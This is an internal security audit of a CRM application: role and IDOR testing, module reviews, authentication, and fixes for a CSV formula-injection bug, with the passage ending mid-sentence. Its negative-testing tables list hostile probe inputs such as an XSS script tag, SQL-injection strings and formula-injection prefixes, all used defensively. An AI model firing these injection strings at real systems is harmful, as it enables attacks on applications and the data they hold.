# CRM — Full End-to-End Audit, Role Testing, Security Review & Production Readiness

**Date:** 2026-08-06
**Scope:** Customer Relationship Management only. Transaction Desk excluded.
**Method:** Running application + live API probing across five identities + database inspection + automated suites + source review.
**Application state:** Not modified. No code, schema, test, config, permission or user-data change was made.

---

---

## ADDENDUM — THREE FIXES APPLIED AFTER THE AUDIT (2026-08-06)

The audit below was read-only. Three of its findings were then fixed on request. **The findings are left
as originally written**, so the report still records what was true when it was taken; this addendum records
what changed afterwards.

| Finding | Was | Now |
|---|---|---|
| **B-01 / S-01** — CSV formula injection in the lead export | 🔴 Confirmed exploitable | ✅ **Fixed**, with 6 e2e tests and a sensitivity check |
| **I-07** — development sends real client email | 🟠 Open (caused a real incident) | ✅ **Fixed** — non-production now diverts by default, 19 tests |
| **I-01** — Prisma schema drift | 🟠 `migrate dev` would drop 6 FKs and 7 indexes | ✅ **Fixed** — `migrate diff` is empty |
| **I-09** — no test for export neutralisation | 🟡 Open | ✅ **Fixed** as part of B-01 |

**Verification after the changes:** server **1,417 / 1,417** tests across **93** suites (was 1,398 / 92 — the
19 new mail-routing tests and one new suite). Client and server both build; both typecheck clean.

### 1. CSV formula injection — fixed in one place, not two

A second vulnerable builder was found during the fix: `CampaignsPage.tsx` had its own byte-identical `esc`
helper for the campaign recipient report, carrying the same untrusted lead names and addresses. **Both** are now
served by one module, `client/src/lib/csv.ts`, so the duplication that let them diverge is gone.

```ts
const FORMULA_LEAD = /^[=+\-@\t\r]/;          // identical to the audit export's server-side rule
export function csvCell(value: unknown): string {
  let s = String(value ?? '');
  if (FORMULA_LEAD.test(s)) s = `'${s}`;      // apostrophe INSIDE the quotes, so it travels with the value
  return `"${s.replace(/"/g, '""')}"`;
}
```

`e2e/tests/lead-export-injection.spec.ts` drives the real Export button, intercepts the real download and reads
the real file — because the defect lived in the browser, and an assertion against the API response would have
passed throughout the entire period the file was dangerous. Five payloads (`=`, `+`, `-`, `@`, tab) plus a sixth
test asserting an **ordinary name is not corrupted** — a fix that prefixed every cell would pass the first five
and quietly damage every export the brokerage relies on.

**Sensitivity-checked:** with the guard commented out, 5 of the 6 fail and the "ordinary name" test still passes.
Exactly the right shape.

One behaviour worth recording: the tab payload arrives in the file leading with `=`, not a tab, because the
application **trims** leading whitespace when it saves a name. Still caught — the test asserts the property that
matters (the cell is neutralised) rather than which character leads.

### 2. Development mail — the default is now safe

The application has exactly **one** `createTransport` and **one** `sendMail`, so `MailerService.redirectTarget()`
governs every outgoing message: campaigns, lead mail, notifications, reminders.

| Environment | `MAIL_REDIRECT_TO` | `MAIL_ALLOW_REAL_SEND` | Result |
|---|---|---|---|
| production | unset | — | sends normally (**unchanged**) |
| production | set | — | diverts there (**unchanged**) |
| **non-production** | **unset** | **unset** | **diverted to `dev-sink@localhost.invalid`** ← the change |
| non-production | set | — | diverts to that address |
| non-production | unset | `1` | sends for real, deliberately |

`.invalid` is reserved by RFC 2606 and can never resolve, so a message that somehow escapes the guard still
reaches nobody. An unset `NODE_ENV` is read as non-production — the safe direction. The mailer logs one line at
boot saying where mail is going, because a safety default nobody can see becomes an afternoon lost to an email
that was never going to arrive.

**Production behaviour is byte-for-byte what it was**, and `mail-redirect.spec.ts` asserts that in both
directions — including that `MAIL_ALLOW_REAL_SEND` is ignored in production, so the escape hatch cannot become a
way to misconfigure live mail.

### 3. Schema drift — reconciled without running any DDL

`schema.prisma` now describes what the database actually contains. **No migration was created and no DDL was
run**; the database was not modified. Only the schema file changed, so that Prisma stops believing the database
is wrong:

- **6 foreign keys** — added `map:` for the three carrying hand-written names (`calendar_event_reminders_event_fk`,
  `calendar_events_recurrence_fk`, `push_subscriptions_user_fk`), and corrected `onDelete`/`onUpdate` on the
  three `company_id` keys that are genuinely `NO ACTION` in the database. Verified against `pg_constraint`, one
  key at a time — an initial blanket edit set `onDelete: NoAction` on all 19 company keys, which was wrong for
  the 16 that are `RESTRICT`, and the diff caught it immediately.
- **7 indexes** that exist in the database but were never declared — now declared, so `migrate dev` no longer
  offers to drop `campaigns_scheduled_for_idx`, `transactions_agent_user_id_idx` and five others.
- **9 index names** aligned with `map:` to the names the database actually uses.
- **3 timestamp columns** corrected from `Timestamp(0)` to `Timestamp(3)`. This one mattered most: Postgres
  **rounds** rather than truncates, so accepting the schema's `(0)` would have rewritten every recorded campaign
  click time by up to half a second.
- **1 undeclared relation** — `calendar_events.recurrence_id` is a real self-referencing foreign key that Prisma
  did not model at all, so `migrate dev` would have dropped the series-to-occurrence integrity outright. It is
  now declared (`onDelete: SetNull`, matching the constraint).

Result:

```
$ prisma migrate diff --from-migrations … --to-schema-datamodel …
-- This is an empty migration.
```

**`migrate deploy` remains the correct command for production.** What has changed is that `migrate dev` is no
longer destructive if somebody runs it by mistake.

---

## AUDIT METHOD AND ITS LIMITS

Every claim below carries an evidence class. Read them; they are not decoration.

| Class | Meaning |
|---|---|
| **RUN** | Verified by driving the running application over HTTP as a signed-in user |
| **DB** | Verified by querying the database directly |
| **TEST** | Verified by an automated test that actually asserts the behaviour |
| **CODE** | Verified by reading the implementation; not exercised at runtime |
| **NOT VERIFIED** | Stated in the system but not confirmed by this audit |

### What was actually run

A dedicated server instance was started on port **8100** against the isolated **`myapp_test`** database, with
`RUN_SCHEDULERS=false`, `IMAP_POLL_DISABLED=1` and `MAIL_REDIRECT_TO=audit-sink@test.local`, so that nothing
in this audit could reach a real mailbox, a real client, or the development data.

Five identities were signed in through the real login form and CSRF exchange:

| Identity | Account | Stored role | User id |
|---|---|---|---|
| Super Admin | `superadmin@test.local` | `admin` | 1 |
| Admin / Manager | `admin@test.local` | `manager` | 2 |
| Agent | `agent@test.local` | `agent` | 3 |
| Agent (second) | `agent2@test.local` | `agent` | 4 |
| CRM / Marketing | `crm@test.local` | `crm` | 7 |

### Limits of this audit — stated plainly

1. **Only one tenant exists.** `company_settings` has exactly one row and every `leads` and `users` row carries
   `company_id = 1` (**DB**). Cross-tenant isolation therefore **could not be tested by experiment**. It is
   assessed structurally only. See §18.
2. **No production system was touched.** All configuration findings describe the development `.env`. Production
   values are **NOT VERIFIED**.
3. **External integrations were not exercised against live providers.** Meta, Google, Twilio and real SMTP/IMAP
   were not called. Their handling is assessed from code and from the application's own error paths.
4. **Browser-level UI testing** was covered by the Playwright suite rather than by manual clicking; where a UI
   claim rests only on source, it is marked **CODE**.

### How CRM scope was determined

Not from menu labels. From `server/src/common/domain.ts` (`SCREEN_DOMAIN`) and `client/src/desk/area.ts`
(`SCREEN_AREA`), which are the two maps the application itself uses:

- **CRM-only screens:** `lead`, `campaigns`, `meta`, `reviews`
- **Shared, each area with its own view:** `inbox`, `dashboard`, `calendar`, `audit`, `triggers`, `settings`
- **Transaction Desk — excluded:** `transactions`, `invoice`, `reports`, `analytics`, `recycle-bin`, `mls`,
  `favorites`, `inventory`

Of **376** distinct HTTP routes in the application, **149** are in CRM scope and **107** are Transaction Desk
routes that this report deliberately ignores.

---

# PART 1 — THE ACTUAL CRM ARCHITECTURE

## Stack

| Layer | Technology |
|---|---|
| Frontend | React 18 + Vite + TypeScript, hooks/context only (no Redux, no React Query) |
| Backend | NestJS 10, global prefix `/api` (except `/sanctum/csrf-cookie`) |
| Database | PostgreSQL 17 via Prisma 6 |
| Session | `express-session` + `connect-pg-simple`, table `user_sessions`, cookie `laravel_session` — **not JWT** |
| Cache/queue | Redis optional; **not configured** — in-process queues, no distributed caching |

## Authorization — three independent layers

1. `@Screen(screen, level)` + `ScreenGuard` — may this role open this module at all
2. `can(user, capability)` — may this role perform this specific operation
3. Owner scoping (`leadScopeWhere`) — which rows, of the ones they may read, are theirs

All three must pass. Layer 3 is the one that actually protects lead data, and it is the subject of §5 and §18.

## The single most important rule in the CRM

`server/src/common/lead-scope.ts`:

```ts
const mine = [{ assigned_to: id }, { owner_user_id: id }];
if (isSuperAdmin(user)) mine.push({ owner_user_id: null });
return { OR: mine };
```

There is **no "see everything" branch for any role**. This is deliberate and documented — see §5.

## Background workers (8 schedulers)

Measured live from `GET /api/health/workers` (**RUN**):

| Scheduler | Interval | CRM relevance |
|---|---|---|
| `lead-task-due` | 1800 s | Lead follow-up reminders |
| `imap-sync` | 60 s | CRM Inbox polling |
| `meta-sync` | 900 s | Meta lead ingestion |
| `campaign resume` | 60 s | Scheduled campaigns + soft-bounce retry |
| `event-reminders` | 600 s | Calendar reminders |
| `google-calendar-retry` | 300 s | Google sync retry |
| `reminder-sweep` | 3600 s | Appointment sweep |
| `export-sweeper` | 900 s | Export cleanup |

All reported `healthy: true, failures: 0` at audit time (**RUN**).

---

# PART 2 & 28 — ROLE TESTING (LIVE)

Every parameterless CRM `GET` route was requested by all four roles plus an anonymous client.
**59 routes × 5 identities = 295 live requests.** Results below are actual HTTP statuses (**RUN**).

## The perimeter holds

- **Every authenticated CRM route returned `401` to an anonymous caller.** No exceptions.
- **Zero `5xx` responses across all 295 requests.**
- Exactly three routes answer the public, and all three must: `campaigns/track/open` (returns a 1×1 GIF),
  `campaigns/track/click` (302), `campaigns/unsubscribe` (renders "Invalid link" without a valid token).
  `meta/webhook` returns **403** to everyone including anonymous — the signature check is real.

## ROLE-COMPARISON MATRIX (measured, not intended)

| CRM Function | Super Admin | Admin/Manager | Agent | CRM/Marketing | Backend enforced | Verified |
|---|---|---|---|---|---|---|
| CRM Dashboard | 200 | 200 | 200 | 200 | ScreenGuard | **RUN** |
| Leads — list/read | 200 (own+unowned) | 200 (own only) | 200 (own only) | 200 (own only) | ScreenGuard + owner scope | **RUN** |
| Leads — another user's lead | **404** | **404** | **404** | **404** | owner scope | **RUN** |
| Lead books (`/leads/books`) | 200 | **403** | **403** | **403** | capability | **RUN** |
| Lead ownership transfer | Allowed | Refused | Refused | Refused | `lead-transfer.service.ts` | **TEST** |
| Campaigns — list | 200 | 200 | 200 | 200 | ScreenGuard | **RUN** |
| Campaign create / test-send | Allowed | Allowed | Allowed | Allowed | capability | **CODE** |
| Campaign templates | 200 | 200 | 200 | 200 | ScreenGuard | **RUN** |
| Meta — status/leads/sync history | 200 | 200 | 200 | 200 | ScreenGuard | **RUN** |
| Meta — auth-url, diagnostics | 200 | 200 | 200 | **403** | capability | **RUN** |
| Calendar — all endpoints | 200 | 200 | 200 | 200 | ScreenGuard + AreaGuard | **RUN** |
| Calendar — another user's event | **404** | **404** | **404** | **404** | owner scope | **RUN** |
| CRM Inbox | 200 | 200 | 200 | 200 | AuthGuard + AreaGuard | **RUN** |
| Triggers (`crm-settings/triggers`) | 200 | 200 | **200** | **200** | `@Screen('triggers')` | **RUN** |
| CRM Settings (all other sections) | 200 | 200 | **403** | **403** | `@Screen('settings')` | **RUN** |
| Audit Trail — listing | 200 | 200 | **403** | **403** | ScreenGuard + AreaGuard | **RUN** |
| Audit Trail — **export** | 200 | 200 | **403** | **403** | same guard as listing | **RUN** |
| Notifications (own) | 200 | 200 | 200 | 200 | AuthGuard, self-scoped | **RUN** |
| Notification preferences (own) | 200 | 200 | 200 | 200 | AuthGuard, self-scoped | **RUN** |

### Notes on the matrix

**Triggers are deliberately more open than the rest of Settings.** An Agent and the CRM role get `200` on
`/api/crm-settings/triggers` and `403` on every other `crm-settings` route. This is intentional and documented in
`permission.service.ts`: triggers are **per-user** (`crm_trigger_settings`), so the grant cannot reach anyone
else's account. Before this split, `triggers` opened a screen whose API demanded `settings`, and four roles were
offered a screen that then refused them. **Correct as built.**

**The CRM/Marketing role is refused Meta connection management** (`auth-url`, `diagnostics` → 403) while an
ordinary Agent is allowed. Given that this role exists to run marketing, this is worth a product decision — see
Issue **I-04**.

## Is Super Admin over-privileged?

**No — and unusually so.** Super Admin was refused (`404`) on another agent's lead, another agent's calendar
event, and another agent's campaign template (**RUN**). The only extra reach Super Admin has is leads with
`owner_user_id IS NULL` (unattributed intake) and the ownership-transfer escalation path, which returns **a count
only, never lead data**.

---

# PART 3–14 — MODULE AUDIT

## MODULE: LEADS

**Purpose.** Capture, own, work and convert prospective clients. The centre of the CRM.

### Feature inventory

| Feature | UI | API | Backend | DB | Permissions | Tests | Status |
|---|---|---|---|---|---|---|---|
| List, paginate, filter, sort | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Search | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Create | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Edit | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Soft delete / restore / purge | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Notes | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Tasks | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Showings | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Calls + recordings | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| SMS | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Email (+ AI generate) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Tags | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| CSV/Excel import (job-based) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Bulk delete | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| Ownership transfer | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ Confirmed |
| **CSV export** | ✅ | ✅ | ✅ | ✅ | ✅ | ⚠️ | 🔴 **Defect — see B-01** |

### Ownership — exactly how it works (RUN + DB + CODE)

A lead is visible when `assigned_to = you` **OR** `owner_user_id = you`. Super Admin additionally sees
`owner_user_id IS NULL`. Nothing else. Measured lead visibility on identical data:

| Identity | Leads visible |
|---|---|
| Super Admin | 16 |
| Admin / Manager | **0** |
| Agent | 36 |
| Agent 2 | 21 |
| CRM / Marketing | 3 |

**Admin/Manager seeing zero leads is correct, not a defect.** It is stated policy in
`docs/LEAD-PRIVACY-POLICY.md` (Status: Accepted 2026-08-01, Owner: Broker of Record):

> *A lead is visible only to the person it is assigned to and the person who owns it. No role, at any rank,
> grants visibility into a colleague's book.*

The consequences are recorded in that document and accepted by the business: no routine managerial oversight,
no system-wide compliance search, and departures require a deliberate ownership transfer. **This audit confirms
the code matches the policy exactly** and raises the operational consequences in §35, not as defects.

### Isolation testing — 16 hostile operations, all refused (RUN)

A lead was created owned by Agent 2, then attacked from Agent 1's session:

| Attempt | Result |
|---|---|
| `GET /api/leads/{id}` | **404** "Lead not found." |
| `PUT` (rename to HIJACK) | **404** |
| `DELETE` | **404** |
| `POST .../notes` | **404** |
| `POST .../tasks` | **404** |
| `PUT .../tasks/{taskId}` | **404** |
| `DELETE .../tasks/{taskId}` | **404** |
| `POST .../email` | **404** |
| `POST .../messages` (SMS) | **404** |
| `POST .../tag` | **404** |
| `POST /api/leads/bulk-delete` with victim id | **400** |
| `DELETE /api/leads/deleted/{id}` (permanent purge) | **404** |
| Same `GET` as **Admin** | **404** |
| Same `GET` as **CRM/Marketing** | **404** |
| Same `GET` as **Super Admin** | **404** |
| Victim lead afterwards | **intact, unchanged, still owned** |

The application answers **404, not 403** — it does not confirm that the record exists. That is the stronger
choice and it is applied consistently.

### Negative testing (RUN)

| Input | Result |
|---|---|
| Empty body | `422` — "A name is required", "An email address is required" |
| Invalid email | `422` — "Enter a valid email address" |
| Unrecognised `lead_source` | `422` — enum whitelist enforced |
| 5,000-character name | `422` |
| `<script>alert(1)</script>` | `422` (rejected on the name rule) |
| `'; DROP TABLE leads;--` | `422`, table intact |
| Hostile ids `0 / -1 / 2147483647 / 99999999` | `404` |
| Non-numeric ids `abc`, `1 OR 1=1`, `1';DROP--` | `400` |
| **Any 500** | **none** |

Field-level enum whitelists (`lead_source`, calendar `type`, notification `category`) mean **mass assignment of
arbitrary values is not possible**.

### 🔴 B-01 — CSV formula injection in the lead export

**This is the one confirmed exploitable defect found in the CRM.** Full detail in §31.

## MODULE: META / FACEBOOK LEAD ADS

| Aspect | Finding | Evidence |
|---|---|---|
| OAuth state signing | Signed with `APP_KEY` (or `SESSION_SECRET`); refuses to start OAuth if neither set | CODE |
| Token storage | AES-256-GCM under a key derived from `APP_KEY`; `plain:` marker if absent, never silent | CODE |
| Missing `APP_KEY` behaviour | `GET /api/meta/status` reports it as a blocker; `meta.controller.ts:332` | CODE |
| Webhook signature | `GET/POST /api/meta/webhook` → **403** to unsigned callers including anonymous | **RUN** |
| Deduplication | `leads_facebook_lead_id_key` unique index on Meta's own submission id | **DB** |
| Notification dedupe | `meta-lead:{metaLeadId}:{recipient}` — keyed on **Meta's** id, so the poll and the webhook cannot both notify | CODE |
| Sync history + error history | Present, `/api/meta/sync-history`, `/api/meta/webhook-health` → 200 | **RUN** |
| Data-deletion callback | `POST /api/meta/data-deletion` present | **RUN** |
| Per-user isolation | Connections are per-user; CRM role refused `auth-url` | **RUN** |

**Not verified:** live OAuth round trip, token expiry/revocation against Meta, real webhook delivery. No Meta
connection exists in the test environment (`/api/meta/pages` → `400` "no connection"), which is itself the
correct error rather than a crash.

## MODULE: CAMPAIGNS

| Feature | Status | Evidence |
|---|---|---|
| Create / edit / delete / cancel | ✅ Confirmed | RUN + TEST |
| Templates (+ categories, attachments) | ✅ Confirmed | RUN |
| Template isolation between users | ✅ Confirmed — Agent gets **404** on Agent 2's template | **RUN** |
| Audience resolution, dedupe, email validation | ✅ Confirmed | CODE + TEST |
| Suppression list | ✅ Confirmed | RUN + TEST |
| Unsubscribe (public) | ✅ Confirmed — invalid token renders "Invalid link", not an error | **RUN** |
| Open tracking (1×1 GIF) | ✅ Confirmed | **RUN** |
| Click tracking (302) | ✅ Confirmed | **RUN** |
| Bounce classification (soft/hard) | ✅ Confirmed | TEST |
| Scheduled send + restart recovery | ✅ Confirmed | TEST |
| Campaign Completed notification | ✅ Wired at `campaigns.service.ts:859` | CODE |
| Campaign Failed notification | ✅ Wired at `:857` and `:882` | CODE |
| **Audience scalability** | 🟡 Risk at scale — see **I-05** | CODE |

## MODULE: CRM CALENDAR

| Feature | Status | Evidence |
|---|---|---|
| Day / week / month views | ✅ Confirmed | TEST |
| Create / edit / delete | ✅ Confirmed | **RUN** |
| Recurrence (weekly, monthly, interval, until) | ✅ Confirmed | TEST |
| Occurrence vs series editing | ✅ Confirmed | TEST |
| To-dos | ✅ Confirmed | **RUN** |
| Reminders | ✅ Confirmed | TEST |
| Type whitelist | ✅ Confirmed — 9 valid types, others `400` | **RUN** |
| **Cross-user isolation** | ✅ Confirmed — Agent and Admin both **404** on Agent 2's event; list excludes it | **RUN** |
| Google Calendar connect/sync/retry/disconnect | ✅ Confirmed | CODE + TEST |
| Google Calendar selection/categories | 🔵 **Intentionally deferred** | — |

## MODULE: CRM INBOX

| Feature | Status | Evidence |
|---|---|---|
| Account config, Gmail OAuth, IMAP, SMTP | ✅ Confirmed | CODE + TEST |
| Polling (60 s), 3 accounts healthy, 0 stale | ✅ Confirmed | **RUN** |
| CRM/desk account scoping (`?scope=crm`) | ✅ Confirmed | CODE |
| Body rendered as text, never HTML | ✅ Confirmed | TEST |
| Read/unread, unread count | ✅ Confirmed | TEST |
| Lead matching | ✅ Confirmed | TEST |
| New-mail notification | ✅ Confirmed — observed live: `"inbox_new_mail" for user #4: delivered [in_app]` | **RUN** |
| **Cross-user access** | ✅ Confirmed — guessed message ids `1/2/0/-1/999999` all **404**, never 500 | **RUN** |
| Draft management / forwarding / threading | ⚪ Not implemented — **out of current-version scope** | — |

## MODULE: CRM DASHBOARD

Returns `leads, tasks, campaigns, inbox, calendar, todos` for all four roles (**RUN**).

**Consistency with records:** the dashboard and the Leads screen both call `liveLeadWhere` — one function, not
two. This was previously a real defect (an administrator's dashboard read 512 while their Leads screen read 0)
and the fix was to centralise the rule. Lead-task counts go through the **parent lead** (`leadTaskScopeWhere`),
which is what makes the tile and the panel beneath it agree.

**No hardcoded or placeholder values were found.** Empty/loading/error states are covered by the e2e suite.

## MODULE: TRIGGERS / AUTOMATION

Automations found by tracing schedulers and event sites, not by reading the Triggers screen:

| Automation | Trigger | Dedupe | Failure isolation |
|---|---|---|---|
| CRM email triggers (per user) | User setting + lead event | Per-user settings row | Warn + continue |
| Calendar event reminders | 600 s sweep | Reminder row | Warn + continue |
| **Lead task due** | 1800 s sweep | `lead-task-due:{taskId}:{date}` | Warn + continue |
| Meta auto-sync | 900 s sweep | Meta submission id | Recorded in sync history |
| Campaign resume / soft-bounce retry | 60 s sweep | Campaign state machine | Terminal state + notification |
| Notification generation | Dispatcher | Unique index on `(user_id, dedupe_key)` | Swallowed, never fails caller |

**Duplicate execution is prevented at the database, not only in code:** `notifications_user_id_dedupe_key_key`
is a real unique index (**DB**). A second delivery attempt cannot insert.

**Race condition risk exists only in multi-process deployment** — see **I-02**, the most important operational
finding in this report.

## MODULE: CRM SETTINGS

| Aspect | Finding | Evidence |
|---|---|---|
| Sections | email settings, profile, referral codes, broadcasts, email log, integrations, options, triggers | **RUN** |
| Permission split | all sections `@Screen('settings')`; triggers `@Screen('triggers')` | **RUN** |
| Agent / CRM access | `403` on all sections except triggers | **RUN** |
| Personal vs brokerage settings | `/api/account/settings` forces `user_id = user.id` regardless of role | CODE |
| Concurrency | `pg_advisory_xact_lock` on the settings write path | CODE |

The personal/brokerage split is worth highlighting: `account.controller.ts` carries `AuthGuard` **only**, and
deliberately calls `getOwnSettings`/`saveOwnSettings` rather than the role-scoped pair. This closes a measured
2026-08-04 defect where an Admin holding `settings: 'view'` was refused `PUT /api/crm-settings` and then allowed
`PUT /api/account/settings`, writing the global row the first route had just refused them. **Correct as built.**

## MODULE: AUDIT TRAIL + EXPORT

| Feature | Status | Evidence |
|---|---|---|
| Listing, search, filters, pagination, detail | ✅ Confirmed | **RUN** |
| Domain isolation (CRM vs Desk) | ✅ Confirmed — CRM and Desk exports differ | **RUN** |
| Permission | ✅ Confirmed — Agent and CRM role **403** on both listing and export | **RUN** |
| **CSV export** | ✅ Confirmed — `200`, 7,389 rows, `attachment; filename="crm-audit-2026-08-06.csv"` | **RUN** |
| **Excel export** | ✅ Confirmed — real `.xlsx` (PK zip signature) | TEST |
| Truncation reported | ✅ `X-Export-Rows`, `X-Export-Truncated` headers, exposed via CORS | **RUN** |
| Invalid filter refused | ✅ `user_id=abc` → `400` (not silently ignored) | TEST |
| Sensitive-field redaction | ✅ 20-term list applied to `field` **and** `section` | CODE |
| **Formula-injection guard** | ✅ **Present and working** — verified live | **RUN** |
| Filters preserved into export | ✅ Shared `buildWhere()`, one implementation | CODE |

Audit row counts (**DB**): `crm` 6,061 · `common` 1,264 · unclassified 70. Unclassified rows appear in *both*
trails by design, so the split never hides history.

**Audit writes are best-effort.** A failed audit write logs a warning and does not roll back the user's work.
The consequence — *absence of an audit entry does not prove the action did not occur* — is documented and is now
alerted on (`audit.failures` on `/api/health/workers`, checked every 5 minutes by `scripts/monitor.mjs`).
Measured at audit time: **0 failures** (**RUN**).

## MODULE: NOTIFICATIONS

### The six required CRM events — all wired to real event sites (CODE + RUN)

| Event | Recipient | Call site | Dedupe key | Link | Status |
|---|---|---|---|---|---|
| New Lead Created | owner/assignee (not the actor) | `leads.service.ts:434` | `lead-created:{leadId}:{userId}` | `/crm/lead/{id}` | ✅ |
| Lead Assigned | new assignee (not the actor) | `leads.service.ts:443, :521` | `lead-assigned:{leadId}:{assignee}` | `/crm/lead/{id}` | ✅ |
| Meta Lead Arrived | connection owner | `meta-sync.service.ts:335` | `meta-lead:{metaLeadId}:{userId}` | `/crm/lead/{id}` | ✅ |
| Lead Task Due | task owner | `lead-task-reminder.service.ts:109` | `lead-task-due:{taskId}:{date}` | `/crm/lead/{id}` | ✅ **RUN** |
| Campaign Completed | campaign owner | `campaigns.service.ts:859` | `campaign-completed:{id}:{owner}` | `/crm/campaigns/{id}` | ✅ |
| Campaign Failed | campaign owner | `campaigns.service.ts:857, :882` | `campaign-failed:{id}:{state}:{owner}` | `/crm/campaigns/{id}` | ✅ |

**Lead Task Due was verified by live scheduler execution**, not by test: a real 30-minute sweep logged
`Lead follow-up reminders: 2 due task(s) processed`, correctly filtering a completed task and a task on a
deleted lead; the subscribed user received exactly one notification and a user who had muted the category
received none, *despite their task being processed*. After a full process restart the sweep ran again and the
count stayed at one — proving dedupe survives restart because it lives in a unique index, not in memory.

### Design property worth stating

Every call site is `void this.crmEvents?.method(...)` — fire-and-forget — and `CrmEventNotifier.send()` wraps
every dispatch in try/catch. **A notification failure cannot fail the lead save or the campaign send.** Both
layers were verified by reading the implementation; the muted-user case above demonstrates the separation of
concerns at runtime (the sweep processes, the dispatcher decides).

### Channels and preferences

13 categories × 3 channels (in-app, email, push), self-scoped per user (**RUN**). Unknown category names are
refused with `400` — a user cannot create preference rows for categories that do not exist, nor set preferences
for another user id (attempted; refused).

Notification isolation between two agents: **disjoint sets, and marking another user's notification read is
refused** (**RUN**).

## MODULE: CLIENT REVIEWS

**Determination: ⚪ Not implemented as a CRM module — and it is dead navigation.** See Issue **B-02**.

- `permission.service.ts:22` defines the screen: `reviews: 'Client Reviews'`
- The CRM role is granted `reviews: 'edit'`; every other role inherits `view` via `fill('view')`
- `SCREEN_DOMAIN.reviews = 'crm'` (server) and `SCREEN_AREA.reviews = 'crm'` (client) — both classify it as CRM
- `DeskLayout.tsx:68` renders it in the sidebar: `{ key: 'reviews', label: 'Client Reviews', ico: 'star' }`
- **`App.tsx` registers no route for `reviews`** — verified against the full list of 21 registered screen routes
- No CRM reviews controller, service or table exists. The only review tables are `transaction_reviews*`, which
  belong to the Transaction Desk and are classified `desk` by `auditDomain()` because they carry a transaction id

Do not confuse this with Transaction reviews, which work.

---

# PART 15 — AUTHENTICATION

| Check | Result | Evidence |
|---|---|---|
| Username login | ✅ | TEST |
| Email login | ✅ | **RUN** (all five identities signed in by email) |
| Case-insensitive login | ✅ `lower()=lower()` equality | TEST |
| Wildcard injection in login | ✅ Fixed — `ILIKE` replaced by equality; `ZZ%@probe.test` no longer matches | TEST |
| Incorrect password / unknown user | ✅ Generic message, no user enumeration | TEST |
| Account lockout + unlock timing | ✅ Per-account and per-IP throttles | TEST |
| **Session regeneration on login** | ✅ `req.session.regenerate()` before the id is set — session fixation closed | TEST |
| Logout invalidates old session | ✅ | TEST |
| CSRF | ✅ Write without `X-XSRF-TOKEN` → **419** | **RUN** |
| Session store | `user_sessions` in Postgres, survives restart | CODE |

## MFA

Endpoints present (**RUN**): TOTP enrol/confirm, email/SMS OTP, recovery codes, trusted devices,
`admin/policies`, `admin/reset/:userId`. `MfaAdminController` carries `AuthGuard, ScreenGuard` — a previously
identified gap where the decorators enforced nothing is now closed.

Secrets are encrypted with a key **domain-separated** from every other use of `APP_KEY`, and `mfa-crypto.ts`
**refuses to store a secret at all** when `APP_KEY` is absent rather than falling back to plaintext.

**Rollout position (as decided):** ship with MFA disabled by default, enable TOTP + recovery codes first, pilot
with administrators, expand later. Nothing in this audit contradicts that plan.

**Not verified in this audit:** live TOTP/OTP code entry, replay rejection, recovery-code single-use, trusted
device expiry. These are covered by the Phase 3 suite (**TEST**) but were not re-driven through the UI here.

---

# PART 16–17 — AUTHORIZATION, SCREEN GUARD, IDOR

## ScreenGuard review

Every CRM controller carrying `@Screen(...)` also carries `ScreenGuard`:

| Controller | Screen | Guards |
|---|---|---|
| `leads.controller.ts` | `lead` | AuthGuard, ScreenGuard |
| `sms.controller.ts` | `lead` | AuthGuard, ScreenGuard |
| `campaigns.controller.ts` | `campaigns` | AuthGuard, ScreenGuard |
| `campaign-templates.controller.ts` | `campaigns` | AuthGuard, ScreenGuard |
| `meta.controller.ts` | `meta` | AuthGuard, ScreenGuard |
| `dashboard.controller.ts` | `dashboard` | AuthGuard, ScreenGuard |
| `calendar.controller.ts`, `todos.controller.ts` | `calendar` | AuthGuard, ScreenGuard, AreaGuard |
| `audit-log.controller.ts` | `audit` | AuthGuard, ScreenGuard, AreaGuard |
| `crm-settings.controller.ts` | `settings`, `triggers` | AuthGuard, ScreenGuard |
| `mfa.controller.ts` | `users` | AuthGuard, ScreenGuard |

**No CRM controller was found where authorization metadata exists but enforcement is absent.** `account.controller.ts`
appears in a naive grep because `@Screen('settings', 'edit')` is mentioned *in a comment*; the controller
deliberately carries `AuthGuard` only and self-scopes its writes (see CRM Settings above).

**Latent architectural risk, not currently exploitable:** `ScreenGuard` is **not global**. A future controller
that adds `@Screen` and forgets `@UseGuards` would enforce nothing, silently. This is the single highest-value
hardening change available and is listed as **I-03**.

## IDOR sweep (RUN)

Attempted across leads, notes, tasks, showings, calendar events, campaign templates, notifications and inbox
messages, using both real ids belonging to another user and guessed/hostile ids.

- **Not one request returned another user's data.**
- **Not one request returned 500.**
- Responses were `404` (application convention) or `400` for malformed ids.

---

# PART 18 — TENANT ISOLATION

**Honest finding: only one tenant exists, so this could not be tested by experiment.**

**DB:** `company_settings` = 1 row. `leads` → `company_id = 1` for all 1,057 live rows. `users` → `company_id = 1`
for all 7. There is no second tenant to attempt access from.

What **is** verified structurally:

| Control | State | Evidence |
|---|---|---|
| `company_id` on root models | Present, `@default(1)`, indexed (`leads_company_id_idx`, `notifications_company_id_idx`) | **DB** |
| Prisma tenant extension | Present, filters root models | CODE |
| Model classification enforced | `tenancy.spec.ts` **fails the build** on an unclassified table | **TEST** |
| `runAsSystem` escapes | `tenant-context.spec.ts` requires written justification per use | **TEST** |
| Derived models | Inherit isolation via parent rather than carrying a second `company_id` that could disagree | CODE |

**Assessment.** The architecture is sound and mechanically enforced, and the "fails the build on an unclassified
table" property is a genuinely strong control. But **a single-tenant deployment has never exercised it**. Before
